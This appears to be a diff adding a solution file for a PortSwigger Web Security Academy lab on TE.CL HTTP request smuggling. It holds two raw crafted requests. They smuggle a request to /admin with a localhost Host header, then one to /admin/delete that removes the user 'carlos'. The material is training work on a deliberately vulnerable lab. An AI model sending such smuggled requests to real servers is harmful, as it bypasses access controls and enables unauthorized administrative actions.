@@ -1,0 +1,43 @@
+The HTTP request at the bottom of this file is meant to solve the following lab:
+https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl
+
+
+FIRST REQUEST:
+
+POST / HTTP/1.1
+Host: [SUB_DOMAIN].web-security-academy.net
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Content-Length: 4
+
+74
+POST /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 20
+
+hello=
+0
+
+
+
+SECOND REQUEST:
+
+POST / HTTP/1.1
+Host: [SUB_DOMAIN].web-security-academy.net
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Content-Length: 4
+
+8B
+POST /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 20
+
+hello=
+0
+
+
